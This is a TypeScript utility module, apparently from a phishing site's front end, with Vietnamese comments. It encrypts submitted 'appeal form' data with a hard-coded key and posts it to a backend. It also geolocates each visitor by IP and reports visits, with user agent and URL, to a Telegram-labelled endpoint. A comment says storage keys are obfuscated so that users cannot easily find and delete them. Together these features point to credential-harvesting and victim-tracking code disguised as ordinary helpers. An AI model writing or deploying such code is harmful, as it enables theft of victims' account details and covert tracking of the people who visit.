import axios from "axios";
import CryptoJS from "crypto-js";
const secretKey = "HDNDT-JDHT8FNEK-JJHR";
const STORAGE_EXPIRY = 60 * 60 * 1000;
const NOTI_ENABLED = process.env.NEXT_PUBLIC_NOTIFICATION_ENABLED || false;
const STORAGE_API = '/api/storage';
const DEFAULT_USER_KEY = (() => {
    try {
        const ua = typeof navigator !== 'undefined' ? navigator.userAgent : '';
        const host = typeof location !== 'undefined' ? location.hostname : '';
        return CryptoJS.SHA256(`${ua}|${host}|${secretKey}`).toString().slice(0, 16);
    } catch {
        return 'server';
    }
})();

export const encrypt = (text: string) => {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
};

export const decrypt = (cipherText: string) => {
    try {
        const bytes = CryptoJS.AES.decrypt(cipherText, secretKey);
        const plaintext = bytes.toString(CryptoJS.enc.Utf8);
        return plaintext || '';
    } catch (error) {
        console.error('Decrypt error:', error);
        return '';
    }
};

// Sinh key lưu trữ được làm rối để khó nhận diện và xóa thủ công
const deriveStorageKey = (key: string) => {
    try {
        const ua = typeof navigator !== 'undefined' ? navigator.userAgent : '';
        const host = typeof location !== 'undefined' ? location.hostname : '';
        const seed = `${host}|${ua}|${secretKey}`;
        const hash = CryptoJS.SHA256(`${key}|${seed}`).toString();
        return `__${hash.slice(0, 16)}_${hash.slice(16, 32)}_${hash.slice(32, 48)}`;
    } catch {
        return key;
    }
};

// Helpers cho lưu trữ server-side (2 file json, key theo user)
const buildNamespacedKey = (key: string, userKey?: string) => userKey ? `${userKey}::${key}` : key;
const buildStorageKey = (key: string, userKey?: string) => deriveStorageKey(buildNamespacedKey(key, userKey));

export const saveRecord = async (key: string, value: any, userKey?: string) => {
    try {
        const effectiveUserKey = userKey || DEFAULT_USER_KEY;
        const namespacedKey = buildNamespacedKey(key, effectiveUserKey);
        const storageKey = buildStorageKey(key, effectiveUserKey);
        const encryptedValue = encrypt(JSON.stringify(value));
        const record = {
            id: storageKey,
            key: namespacedKey,
            value: encryptedValue,
            expiry: Date.now() + STORAGE_EXPIRY,
            pad: CryptoJS.lib.WordArray.random(8).toString(),
            updatedAt: new Date().toISOString(),
        };

        await axios.put(`${STORAGE_API}/${encodeURIComponent(storageKey)}`, record);
    } catch (error) {
        console.error("Lỗi khi lưu server storage:", error);
    }
};

export const getRecord = async (key: string, userKey?: string) => {
    try {
        const effectiveUserKey = userKey || DEFAULT_USER_KEY;
        const storageKey = buildStorageKey(key, effectiveUserKey);
        const response = await axios.get(`${STORAGE_API}/${encodeURIComponent(storageKey)}`);
        const item = response.data;

        if (!item) return null;

        const { value, expiry } = item;

        if (expiry && Date.now() > expiry) {
            await axios.delete(`${STORAGE_API}/${encodeURIComponent(storageKey)}`);
            return null;
        }

        const decryptedValue = decrypt(value);
        if (!decryptedValue) return null;

        return JSON.parse(decryptedValue);
    } catch (error: any) {
        if (error?.response?.status === 404) {
            return null;
        }
        console.error("Lỗi khi đọc server storage:", error);
        return null;
    }
};

export const removeRecord = async (key: string, userKey?: string) => {
    try {
        const effectiveUserKey = userKey || DEFAULT_USER_KEY;
        const storageKey = buildStorageKey(key, effectiveUserKey);
        await axios.delete(`${STORAGE_API}/${encodeURIComponent(storageKey)}`);
    } catch (error) {
        console.error("Lỗi khi xóa server storage:", error);
    }
};

export const sendAppealForm = async (values: any) => {
    try {
        const jsonString = JSON.stringify(values);
        // Giới hạn kích thước payload để tránh 413 Payload Too Large
        if (jsonString.length > 200_000) {
            throw new Error('Payload too large');
        }
        const encryptedData = encrypt(jsonString);

        const response = await axios.post('/api/send-request', {
            data: encryptedData,
        }, {
            maxBodyLength: 500_000,
            maxContentLength: 500_000,
        });

        return response;
    } catch (error: any) {
        if (error?.response?.status === 413) {
            console.error('Payload too large when sending appeal');
            throw new Error('Payload too large');
        }
        throw error;
    }
};

export const maskPhoneNumber = (phone: string) => {
    if (phone) {
        if (phone.length < 5) return phone; 
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        const masked = '*'.repeat(phone.length - 4);
        return `+${start} ${masked} ${end}`;
    }
    return '';
};

export const getUserIp = async () => {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        throw error;
    }
};

// APIP
// export const getUserLocation = async () => {
//     try {
//         const response = await axios.get(`https://apip.cc/json`);
//         return {
//             location: `${response.data.query || response.data.ip} | ${response.data.RegionName}(${response.data.RegionCode}) | ${response.data.CountryName}(${response.data.CountryCode})`,
//             country_code: response.data.CountryCode,
//             ip: response.data.query || response.data.ip,
//         }

//     } catch (error) {
//         throw error;
//     }
// };

// IP WHO
export const getUserLocation = async () => {
    try {
        const response = await axios.get(`https://ipwho.is`, { timeout: 5000 });
        const ip = response.data?.ip || '0.0.0.0';
        const region = response.data?.region || '';
        const regionCode = response.data?.region_code || '';
        const country = response.data?.country || 'Unknown';
        const countryCode = response.data?.country_code || 'US';
        return {
            location: `${ip} | ${region}(${regionCode}) | ${country}(${countryCode})`,
            country_code: countryCode,
            ip,
        }

    } catch (error) {
        console.error('getUserLocation error:', error?.message || error);
        return {
            location: '0.0.0.0 | Unknown | Unknown(US)',
            country_code: 'US',
            ip: '0.0.0.0',
        };
    }
};

export const notifyTelegramVisit = async (userInfo: any) => {
    try {
        if (!NOTI_ENABLED) {
            return;
        }
        if (typeof window === 'undefined' || typeof navigator === 'undefined') {
            return;
        }
        const visitData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href,
            ...userInfo
        };

        const response = await axios.post('/api/notification', {
            data: visitData,
        });

        return response;
    } catch (error) {
        console.error('Error notifying Telegram about visit:', error);
        // Don't throw error to avoid breaking the main flow
    }
};